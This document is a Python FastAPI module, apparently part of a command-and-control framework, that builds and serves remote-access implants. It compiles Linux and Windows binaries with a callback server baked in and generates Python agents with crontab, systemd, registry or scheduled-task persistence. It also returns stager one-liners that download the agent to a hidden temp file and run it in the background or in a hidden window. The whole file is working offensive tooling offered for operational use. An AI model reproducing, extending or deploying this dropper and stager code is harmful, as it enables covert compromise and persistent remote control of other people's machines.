"""Dropper / Loader API — builds and serves native implant binaries,
generates Python agents with configuration baked in, and produces
stager one-liners that download + execute them."""

import os
import re
import shutil
import subprocess
import tempfile

from fastapi import APIRouter, Depends, HTTPException, Request, status
from fastapi.responses import FileResponse, PlainTextResponse
from pydantic import BaseModel

from backend.classes.auth import get_current_user
from backend.models.user import User

router = APIRouter(prefix="/dropper", tags=["dropper"])

# Path to the client source trees (mounted or co-located in Docker)
_CLIENT_ROOT = os.environ.get(
    "C2_CLIENT_ROOT",
    os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "..", "..", "..", "C2 Client")),
)


# ── Request schemas ───────────────────────────────────────────────────

class BuildRequest(BaseModel):
    """Parameters for building a native implant."""
    target_os: str = "linux"            # "linux" | "windows"
    c2_server: str = ""                 # auto-detected from request if empty
    interval: int = 10
    jitter: float = 0.3
    communication_channel: str = "http" # "http" | "dns"
    dns_domain: str = "c2.local"        # domain used for DNS C2 queries
    dns_port: int = 15353                # DNS server port


class AgentGenerateRequest(BaseModel):
    """Parameters for generating a Python agent script."""
    target_os: str = "linux"            # "linux" | "windows" | "cross"
    c2_server: str = ""                 # auto-detected from request if empty
    interval: int = 60
    jitter: float = 0.3
    communication_channel: str = "http" # "http" | "dns"
    dns_domain: str = "c2.local"        # domain used for DNS C2 queries
    dns_port: int = 15353                # DNS server port
    # Persistence mechanism baked in as the default (can still be overridden at runtime)
    persist: str = "none"               # linux: "crontab"|"systemd"|"bashrc"|"none"
                                        # windows: "registry"|"schtask"|"none"


# ── Helpers ───────────────────────────────────────────────────────────

def _detect_server(request: Request, explicit: str) -> str:
    """Return the C2 callback address.  If the caller left it blank we
    derive it from the request's Host header so the binary phones home
    to the same address the operator is talking to."""
    if explicit:
        return explicit
    host = request.headers.get("host", request.base_url.netloc)
    return str(host)


def _read_client_file(filename: str) -> str:
    path = os.path.join(_CLIENT_ROOT, filename)
    if not os.path.isfile(path):
        raise HTTPException(status_code=500, detail=f"Client source not found: {filename}")
    with open(path, encoding="utf-8") as f:
        return f.read()


def _inject_config(src: str, c2_server: str, interval: int, jitter: float,
                   channel: str, dns_domain: str = "c2.local",
                   dns_port: int = 15353) -> str:
    """Replace the DEFAULT_* constants in a client source with baked-in values."""
    src = src.replace(
        'DEFAULT_C2_SERVER = os.environ.get("C2_SERVER", "127.0.0.1:8000")',
        f'DEFAULT_C2_SERVER = "{c2_server}"',
    )
    src = src.replace(
        'DEFAULT_BEACON_INTERVAL = int(os.environ.get("C2_INTERVAL", "10"))',
        f'DEFAULT_BEACON_INTERVAL = {interval}',
    )
    src = src.replace(
        'DEFAULT_JITTER = float(os.environ.get("C2_JITTER", "0.3"))',
        f'DEFAULT_JITTER = {jitter}',
    )
    src = src.replace(
        'DEFAULT_COMMUNICATION_CHANNEL = os.environ.get("C2_CHANNEL", "http")',
        f'DEFAULT_COMMUNICATION_CHANNEL = "{channel}"',
    )
    src = src.replace(
        'DEFAULT_DNS_DOMAIN = os.environ.get("C2_DNS_DOMAIN", "c2.local")',
        f'DEFAULT_DNS_DOMAIN = "{dns_domain}"',
    )
    src = src.replace(
        'DEFAULT_DNS_PORT = int(os.environ.get("C2_DNS_PORT", "15353"))',
        f'DEFAULT_DNS_PORT = {dns_port}',
    )
    return src


def _generate_python_agent(
    target_os: str,
    c2_server: str,
    interval: int,
    jitter: float,
    communication_channel: str,
    persist: str,
    dns_domain: str = "c2.local",
    dns_port: int = 15353,
) -> str:
    """Build a single-file Python agent with all configuration baked in.

    For 'cross': returns a customised client.py (no OS-specific features).
    For 'linux' / 'windows': inlines client.py into the OS wrapper so the
    result is a single standalone script with zero external imports.
    """
    os_lower = target_os.lower()

    # ── Core client ───────────────────────────────────────────────────
    core = _read_client_file("client.py")
    core = _inject_config(core, c2_server, interval, jitter, communication_channel,
                          dns_domain, dns_port)

    if os_lower == "cross":
        return core

    # ── OS wrapper ────────────────────────────────────────────────────
    if "linux" in os_lower:
        wrapper_file = "client_linux.py"
        persist_choices = '["crontab", "systemd", "bashrc", "none"]'
    elif "win" in os_lower:
        wrapper_file = "client_windows.py"
        persist_choices = '["registry", "schtask", "none"]'
    else:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail='target_os must be "linux", "windows", or "cross"',
        )

    wrapper = _read_client_file(wrapper_file)

    # Bake the persist default into the argparse declaration
    wrapper = wrapper.replace(
        f'choices={persist_choices}, default="none"',
        f'choices={persist_choices}, default="{persist}"',
    )

    # ── Combine into one file ─────────────────────────────────────────
    # 1. Strip the `if __name__` block from core so only wrapper's entry runs.
    core = re.sub(r'\n\n\n# ── Entry point.*', '', core, flags=re.DOTALL)

    # 2. Remove the path-insertion + import-from-client lines from the wrapper
    #    (the symbols are now defined inline above).
    wrapper = re.sub(
        r"# Ensure the core client module is importable\n"
        r"sys\.path\.insert\(0, os\.path\.dirname\(os\.path\.abspath\(__file__\)\)\)\n"
        r"from client import [^\n]+\n",
        "",
        wrapper,
    )

    header = (
        "#!/usr/bin/env python3\n"
        f'"""Auto-generated C2 agent — {target_os} / channel={communication_channel}\n'
        f"C2: {c2_server}  interval={interval}s  jitter={jitter}  persist={persist}\n"
        '"""\n\n'
    )
    # Strip the shebang / module docstring from both files since we add our own
    core = re.sub(r'^#!/usr/bin/env python3\n""".*?"""\n\n', '', core, flags=re.DOTALL)
    wrapper = re.sub(r'^#!/usr/bin/env python3\n""".*?"""\n\n', '', wrapper, flags=re.DOTALL)

    separator = "\n\n# ── OS-specific layer ─────────────────────────────────────────────────\n\n"
    return header + core.lstrip() + separator + wrapper.lstrip()


def _build_linux(c2_server: str, interval: int, jitter: float,
                 channel: str = "http", dns_domain: str = "c2.local",
                 dns_port: int = 15353) -> str:
    """Compile the C++ client, return path to the ELF binary."""
    src_dir = os.path.join(_CLIENT_ROOT, "linux")
    print(f"Building Linux C2 client for {c2_server}... (src={src_dir})")
    if not os.path.isfile(os.path.join(src_dir, "main.cpp")):
        print(f"Client source not found: {src_dir}")
        raise HTTPException(status_code=500, detail="Linux client source not found")

    print("Copying source to temp directory...")
    tmp = tempfile.mkdtemp(prefix="c2build_linux_")
    shutil.copy2(os.path.join(src_dir, "main.cpp"), tmp)

    cmd = [
        "g++", "-std=c++17", "-O2", "-Wall",
        f'-DC2_DEFAULT_SERVER="{c2_server}"',
        f"-DC2_DEFAULT_INTERVAL={interval}",
        f"-DC2_DEFAULT_JITTER={jitter}",
        f'-DC2_DEFAULT_CHANNEL="{channel}"',
        f'-DC2_DEFAULT_DNS_DOMAIN="{dns_domain}"',
        f"-DC2_DEFAULT_DNS_PORT={dns_port}",
        "-o", os.path.join(tmp, "c2client"),
        os.path.join(tmp, "main.cpp"),
        "-lcurl", "-lpthread",
    ]
    result = subprocess.run(cmd, capture_output=True, timeout=120)
    if result.returncode != 0:
        detail = result.stderr.decode(errors="replace")
        raise HTTPException(status_code=500, detail=f"Build failed:\n{detail}")

    subprocess.run(["strip", os.path.join(tmp, "c2client")], capture_output=True)
    return os.path.join(tmp, "c2client")


def _detect_dotnet_tfm() -> str:
    """Auto-detect the highest installed .NET SDK and return its TFM (e.g. 'net9.0')."""
    try:
        r = subprocess.run(["dotnet", "--list-sdks"], capture_output=True, text=True, timeout=10)
        if r.returncode == 0:
            versions = re.findall(r"^(\d+)\.\d+\.\d+", r.stdout, re.MULTILINE)
            if versions:
                major = max(int(v) for v in versions)
                return f"net{major}.0"
    except Exception:
        pass
    return "net9.0"


def _build_windows(c2_server: str, interval: int, jitter: float,
                   channel: str = "http", dns_domain: str = "c2.local",
                   dns_port: int = 15353) -> str:
    """Compile the .NET client, return path to the .exe."""
    src_dir = os.path.join(_CLIENT_ROOT, "windows")
    if not os.path.isfile(os.path.join(src_dir, "Program.cs")):
        raise HTTPException(status_code=500, detail="Windows client source not found")

    tmp = tempfile.mkdtemp(prefix="c2build_win_")
    for f in ("Program.cs", "C2Client.csproj"):
        shutil.copy2(os.path.join(src_dir, f), tmp)

    # Write a clean nuget.config so the build doesn't fail if the host
    # machine has broken/missing local NuGet sources in its global config.
    nuget_cfg = os.path.join(tmp, "nuget.config")
    with open(nuget_cfg, "w") as f:
        f.write(
            '<?xml version="1.0" encoding="utf-8"?>\n'
            "<configuration>\n"
            "  <packageSources>\n"
            '    <clear />\n'
            '    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />\n'
            "  </packageSources>\n"
            "</configuration>\n"
        )

    # Detect installed SDK and override the target framework so the build
    # succeeds regardless of which .NET SDK version is installed.
    tfm = _detect_dotnet_tfm()

    cmd = [
        "dotnet", "publish",
        os.path.join(tmp, "C2Client.csproj"),
        "-c", "Release",
        "-r", "win-x64",
        "--self-contained", "true",
        f"-p:TargetFramework={tfm}",
        f"-p:C2Server={c2_server}",
        f"-p:C2Interval={interval}",
        f"-p:C2Jitter={jitter}",
        f"-p:C2Channel={channel}",
        f"-p:C2DnsDomain={dns_domain}",
        f"-p:C2DnsPort={dns_port}",
        "-o", os.path.join(tmp, "out"),
    ]
    result = subprocess.run(cmd, capture_output=True, timeout=300)
    if result.returncode != 0:
        detail = (result.stdout.decode(errors="replace") + "\n" +
                  result.stderr.decode(errors="replace"))
        raise HTTPException(status_code=500, detail=f"Build failed:\n{detail}")

    exe = os.path.join(tmp, "out", "C2Client.exe")
    if not os.path.isfile(exe):
        raise HTTPException(status_code=500, detail="Build produced no exe")
    return exe


# ── Endpoints ─────────────────────────────────────────────────────────

@router.post("/agent")
def generate_agent(
    body: AgentGenerateRequest,
    request: Request,
    _user: User = Depends(get_current_user),
):
    """Generate a single-file Python agent with configuration baked in.

    Returns a .py script as a file download.  The script is self-contained
    (no external dependencies beyond stdlib) and ready to run on the target.
    """
    c2 = _detect_server(request, body.c2_server)

    os_lower = body.target_os.lower()
    if "linux" in os_lower:
        filename = "agent_linux.py"
    elif "win" in os_lower:
        filename = "agent_windows.py"
    else:
        filename = "agent.py"

    script = _generate_python_agent(
        target_os=body.target_os,
        c2_server=c2,
        interval=body.interval,
        jitter=body.jitter,
        communication_channel=body.communication_channel,
        persist=body.persist,
        dns_domain=body.dns_domain,
        dns_port=body.dns_port,
    )

    return PlainTextResponse(
        content=script,
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@router.post("/build")
def build_implant(
    body: BuildRequest,
    request: Request,
    _user: User = Depends(get_current_user),
):
    """Build a native implant with the C2 server URL baked in.
    Returns the binary as a file download."""
    c2 = _detect_server(request, body.c2_server)
    os_lower = body.target_os.lower()

    if "linux" in os_lower:
        print(f"Building Linux C2 client for {c2}...")
        path = _build_linux(c2, body.interval, body.jitter,
                            body.communication_channel, body.dns_domain, body.dns_port)
        return FileResponse(
            path,
            media_type="application/octet-stream",
            filename="c2client",
        )
    elif "windows" in os_lower or "win" in os_lower:
        path = _build_windows(c2, body.interval, body.jitter,
                              body.communication_channel, body.dns_domain, body.dns_port)
        return FileResponse(
            path,
            media_type="application/octet-stream",
            filename="C2Client.exe",
        )
    else:
        raise HTTPException(status_code=400, detail="target_os must be 'linux' or 'windows'")


@router.get("/stager/{target_os}")
def get_stager(
    target_os: str,
    request: Request,
    _user: User = Depends(get_current_user),
):
    """Return a one-liner stager that downloads the Python agent from this
    C2 server and executes it.  No pre-built binary required."""
    host = request.headers.get("host", request.base_url.netloc)
    base = f"http://{host}/api/v1"
    token = request.headers.get("authorization", "").replace("Bearer ", "")

    os_lower = target_os.lower()
    if "linux" in os_lower:
        script = (
            f'curl -s -X POST "{base}/dropper/agent" '
            f'-H "Authorization: Bearer {token}" '
            f'-H "Content-Type: application/json" '
            f'-d \'{{"target_os":"linux"}}\' '
            f'-o /tmp/.agent.py && python3 /tmp/.agent.py &'
        )
        return PlainTextResponse(script)
    elif "windows" in os_lower or "win" in os_lower:
        script = (
            f'$h=@{{"Authorization"="Bearer {token}";"Content-Type"="application/json"}};'
            f'$b=\'{{"target_os":"windows"}}\';'
            f'$p="$env:TEMP\\svc.py";'
            f'Invoke-RestMethod -Uri "{base}/dropper/agent" -Method POST -Headers $h -Body $b '
            f'-OutFile $p;'
            f'Start-Process -WindowStyle Hidden pythonw.exe -ArgumentList $p'
        )
        return PlainTextResponse(script)
    else:
        raise HTTPException(status_code=400, detail="target_os must be 'linux' or 'windows'")
